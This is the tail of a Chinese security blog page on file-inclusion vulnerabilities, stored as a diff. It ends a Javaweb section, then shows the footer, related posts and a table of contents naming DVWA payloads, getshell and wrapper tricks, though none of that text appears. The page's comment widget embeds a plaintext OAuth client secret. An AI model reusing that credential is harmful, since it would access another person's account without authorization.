+	srcset="/p/web%E5%AE%89%E5%85%A8%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/d7064dfe44ecc3d88e90c2f4c435acddafedf233_hua30fbd3dfd22e934a64a9fe8137c9c2f_44442_480x0_resize_box_3.png 480w, /p/web%E5%AE%89%E5%85%A8%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/d7064dfe44ecc3d88e90c2f4c435acddafedf233_hua30fbd3dfd22e934a64a9fe8137c9c2f_44442_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="锵锵锵，被执行了"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="435"
+		data-flex-basis="1045px"
+	
+></p>
+<h4 id="注意事项">注意事项</h4>
+<p>在本实验中被包含文件后缀会被识别，不会强制当成jsp代码执行，另外一种包含的方式<code>&lt;%@include file='文件'%&gt;</code>可以&hellip;但是file后面的东西必须是字符串，不能是变量，因此无法造成文件包含漏洞&hellip;</p>
+<p>由此可见，Javaweb在这方面的安全性比PHP会高一些</p>
+
+</section>
+
+
+    <footer class="article-footer">
+    
+    <section class="article-tags">
+        
+            <a href="/tags/web-sec/">Web Sec</a>
+        
+    </section>
+
+
+    
+    <section class="article-copyright">
+        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <path d="M14.5 9a3.5 4 0 1 0 0 6" />
+</svg>
+
+
+
+        <span>Licensed under CC BY-NC-SA 4.0</span>
+    </section>
+    </footer>
+
+
+    
+</article>
+
+    
+
+    
+
+<aside class="related-content--wrapper">
+    <h2 class="section-title">Related content</h2>
+    <div class="related-content">
+        <div class="flex article-list--tile">
+            
+                
+<article class="has-image">
+    <a href="/p/web%E5%AE%89%E5%85%A8%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/%E6%B3%A8%E5%85%A5rce/">
+        
+        
+            <div class="article-image">
+                <img src="/p/web%E5%AE%89%E5%85%A8%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/%E6%B3%A8%E5%85%A5rce/cover.6c0349c21e246ba5c06b72ea79814838_hu7c854b3953090c9fdfa2da02ac591aa6_4062930_250x150_fill_q75_box_smart1.jpg" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post Web安全:命令执行/注入(RCE)"
+                        
+                        data-hash="md5-bANJwh4ka6XAa3LqeYFIOA==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">Web安全:命令执行/注入(RCE)</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/p/web%E5%AE%89%E5%85%A8sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%92%8C%E7%AE%80%E5%8D%95%E7%BB%95%E8%BF%87%E7%AC%94%E8%AE%B0/">
+        
+        
+            <div class="article-image">
+                <img src="/p/web%E5%AE%89%E5%85%A8sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%92%8C%E7%AE%80%E5%8D%95%E7%BB%95%E8%BF%87%E7%AC%94%E8%AE%B0/cover.83f907b854aabf08219afb59282a127f_hub39257f7b520a72e81a71654a57446e0_105468_250x150_fill_q75_box_smart1.jpg" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post Web安全:SQL注入基础知识和简单绕过笔记"
+                        
+                        data-hash="md5-g/kHuFSqvwghmvtZKCoSfw==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">Web安全:SQL注入基础知识和简单绕过笔记</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/p/web%E5%AE%89%E5%85%A8%E5%85%B3%E4%BA%8E%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E9%82%A3%E4%BA%9B%E4%BA%8B/">
+        
+        
+            <div class="article-image">
+                <img src="/p/web%E5%AE%89%E5%85%A8%E5%85%B3%E4%BA%8E%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E9%82%A3%E4%BA%9B%E4%BA%8B/cover.2d08c3607afcf5fd71db66ccf33340ce_hub66e432b1b6d7210dd7ccd81a1693998_438324_250x150_fill_q75_box_smart1.jpg" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post Web安全:关于信息收集那些事"
+                        
+                        data-hash="md5-LQjDYHr89f1x22bM8zNAzg==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">Web安全:关于信息收集那些事</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/p/web%E5%AE%89%E5%85%A8--%E6%B5%8F%E8%A7%88%E5%99%A8%E4%BF%A1%E6%81%AF%E4%BC%AA%E9%80%A0/">
+        
+        
+            <div class="article-image">
+                <img src="/p/web%E5%AE%89%E5%85%A8--%E6%B5%8F%E8%A7%88%E5%99%A8%E4%BF%A1%E6%81%AF%E4%BC%AA%E9%80%A0/cover.f63b69aa4f4219156654b595210bbc9d_hu337d2e493e824d835754f79e3b77496e_3809477_250x150_fill_q75_box_smart1.jpg" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post Web安全--浏览器信息伪造"
+                        
+                        data-hash="md5-9jtpqk9CGRVmVLWVIQu8nQ==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">Web安全--浏览器信息伪造</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/p/pwn-pwn-pang-part6---rop/">
+        
+        
+            <div class="article-image">
+                <img src="/p/pwn-pwn-pang-part6---rop/cover.9ce3629f5f54def41971d23600c4a453_hu76ffa02a199d8318bcf8bc7fd89975bb_336695_250x150_fill_q75_box_smart1.jpg" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post PWN! PWN! PANG! Part6 --- ROP"
+                        
+                        data-hash="md5-nONin19U3vQZcdI2AMSkUw==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">PWN! PWN! PANG! Part6 --- ROP</h2>
+        </div>
+    </a>
+</article>
+
+            
+        </div>
+    </div>
+</aside>
+
+     
+    
+        
+    <div id="gitalk-container"></div>
+<link
+    rel="stylesheet"
+    href="https://cdn.jsdelivr.net/npm/gitalk@1.7.2/dist/gitalk.css"
+/>
+<script src="https://cdn.jsdelivr.net/npm/gitalk@1.7.2/dist/gitalk.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/blueimp-md5@2.18.0/js/md5.min.js"></script>
+<script>
+    const gitalk = new Gitalk({
+        clientID: "350f7151191770b41225",
+        clientSecret: "dfc2d6ff148e57ac47c9efedb4ddf9c370fc33f0",
+        repo: "kira-pgr.github.io",
+        owner: "Kira-Pgr",
+        admin: ["Kira-Pgr"],
+        distractionFreeMode: false, 
+        id: md5(location.pathname), 
+    });
+    (function () {
+        if (
+            ["localhost", "127.0.0.1"].indexOf(window.location.hostname) != -1
+        ) {
+            document.getElementById("gitalk-container").innerHTML =
+                "Gitalk comments not available by default when the website is previewed locally.";
+            return;
+        }
+        gitalk.render("gitalk-container");
+    })();
+</script>
+
+
+
+    
+
+    <footer class="site-footer">
+    <section class="copyright">
+        &copy; 
+        
+        2022 猫猫の博客
+    </section>
+    
+    <section class="powerby">
+        
+            For a better open source community! <br/>
+        Built with <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> <br />
+        Theme <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="3.13.0">Stack</a></b> designed by <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a>
+    </section>
+</footer>
+
+
+    
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    
+    <div class="pswp__bg"></div>
+
+    
+    <div class="pswp__scroll-wrap">
+
+        
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                
+                
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
+                defer
+                >
+            </script><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
+                defer
+                >
+            </script><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css"crossorigin="anonymous"
+            ><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css"crossorigin="anonymous"
+            >
+
+            </main>
+    <aside class="sidebar right-sidebar sticky">
+        
+            
+                
+    <section class="widget archives">
+        <div class="widget-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <line x1="5" y1="9" x2="19" y2="9" />
+  <line x1="5" y1="15" x2="19" y2="15" />
+  <line x1="11" y1="4" x2="7" y2="20" />
+  <line x1="17" y1="4" x2="13" y2="20" />
+</svg>
+
+
+
+        </div>
+        <h2 class="widget-title section-title">Table of contents</h2>
+        
+        <div class="widget--toc">
+            <nav id="TableOfContents">
+  <ol>
+    <li><a href="#漏洞原理">漏洞原理</a></li>
+    <li><a href="#分类">分类</a>
+      <ol>
+        <li><a href="#远程文件包含rfiremote-file-inclusion">远程文件包含（RFI，Remote File Inclusion）</a>
+          <ol>
+            <li><a href="#额外要求">额外要求</a></li>
+          </ol>
+        </li>
+        <li><a href="#本地文件包含lfilocal-file-inclusion">本地文件包含（LFI，Local File Inclusion）</a></li>
+      </ol>
+    </li>
+    <li><a href="#危害">危害</a></li>
+    <li><a href="#dvwa靶场实战">DVWA靶场实战</a>
+      <ol>
+        <li><a href="#low">low</a>
+          <ol>
+            <li><a href="#payload1本地--利用相对路径许多个就一定会来到根目录">payload1:本地&ndash;利用相对路径(许多个<code>../</code>就一定会来到根目录)</a></li>
+            <li><a href="#payload2本地--利用绝对路径">payload2:本地&ndash;利用绝对路径</a></li>
+            <li><a href="#payload3远程包含">payload3:远程包含</a></li>
+          </ol>
+        </li>
+        <li><a href="#medium">medium</a>
+          <ol>
+            <li><a href="#payload1本地--绝对路径">payload1:本地&ndash;绝对路径</a></li>
+            <li><a href="#payload2远程--双写绕过">payload2:远程&ndash;双写绕过</a></li>
+            <li><a href="#payload3远程--大小写绕过">payload3:远程&ndash;大小写绕过</a></li>
+            <li><a href="#payload4远程本地皆可--使用httphttps外的协议">payload4:远程本地皆可&ndash;使用http/https外的协议</a></li>
+          </ol>
+        </li>
+        <li><a href="#high">high</a>
+          <ol>
+            <li><a href="#payload1file协议正合我意">payload1:file协议正合我意</a></li>
+            <li><a href="#补充-php中文件包含函数">补充: PHP中文件包含函数</a></li>
+            <li><a href="#payload2利用php可以包含多个文件的feature">payload2:利用PHP可以包含多个文件的feature</a></li>
+          </ol>
+        </li>
+      </ol>
+    </li>
+    <li><a href="#修复">修复</a></li>
+    <li><a href="#getshellsession与文件包含漏洞的结合">Getshell:session与文件包含漏洞的结合</a>
+      <ol>
+        <li><a href="#条件">条件</a></li>
+        <li><a href="#分析">分析</a></li>
+        <li><a href="#利用">利用</a></li>
+        <li><a href="#思考">思考</a></li>
+      </ol>
+    </li>
+    <li><a href="#bypass远程文件包含绕过特定后缀限制">Bypass:远程文件包含绕过特定后缀限制</a>
+      <ol>
+        <li><a href="#绕过">?绕过</a></li>
+        <li><a href="#绕过-1">#绕过</a></li>
+      </ol>
+    </li>
+    <li><a href="#技巧php伪协议">技巧:PHP伪协议</a>
+      <ol>
+        <li><a href="#php-输入输出流">php:// 输入输出流</a>
+          <ol>
+            <li><a href="#用法">用法</a></li>
+            <li><a href="#过程">过程</a></li>
+            <li><a href="#条件-1">条件</a></li>
+          </ol>
+        </li>
+        <li><a href="#phar伪协议">phar://伪协议</a>
+          <ol>
+            <li><a href="#用法-1">用法</a></li>
+            <li><a href="#过程-1">过程</a></li>
+          </ol>
+        </li>
+        <li><a href="#zip伪协议">zip伪协议</a>
+          <ol>
+            <li><a href="#用法-2">用法</a></li>
+            <li><a href="#条件-2">条件</a></li>
+            <li><a href="#过程-2">过程</a></li>
+          </ol>
+        </li>
+        <li><a href="#phpinput">php://input</a>
+          <ol>
+            <li><a href="#用法-3">用法</a></li>
+            <li><a href="#条件-3">条件</a></li>
+            <li><a href="#过程-3">过程</a></li>
+          </ol>
+        </li>
+      </ol>
+    </li>
+    <li><a href="#补充系统中的敏感路径">补充:系统中的敏感路径</a></li>
+    <li><a href="#javaweb文件包含">Javaweb:文件包含?</a>
+      <ol>
+        <li><a href="#小逝验">小逝验</a>
+          <ol>
+            <li><a href="#玩法">玩法</a></li>
+            <li><a href="#测试">测试</a></li>
+            <li><a href="#注意事项">注意事项</a></li>
+          </ol>
+        </li>
+      </ol>
+    </li>
+  </ol>
+</nav>
+        </div>
+    </section>
+
+            
+        
+    </aside>
+
+
+        </div>
+        <script 
+                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js"integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z&#43;KMkF24hUW8WePSA9HM="crossorigin="anonymous"
+                
+                >
+            </script><script type="text/javascript" src="/ts/main.js" defer></script>
+<script>
+    (function () {
+        const customFont = document.createElement('link');
+        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";
+
+        customFont.type = "text/css";
+        customFont.rel = "stylesheet";
+
+        document.head.appendChild(customFont);
+    }());
+</script>
+<script src="/js/snow.js"></script>
+<script
+    src="https://cdn.jsdelivr.net/gh/zhixuan2333/gh-blog@v0.1.0/js/ribbon.min.js"
+    integrity="sha384-UEK8ZiP3VgFNP8KnKMKDmd4pAUAOJ59Y2Jo3ED2Z5qKQf6HLHovMxq7Beb9CLPUe"
+    crossorigin="anonymous"
+    size="300"
+    alpha="0.6"
+    zindex="-1"
+    defer
+></script>
+
+    </body>
+</html>
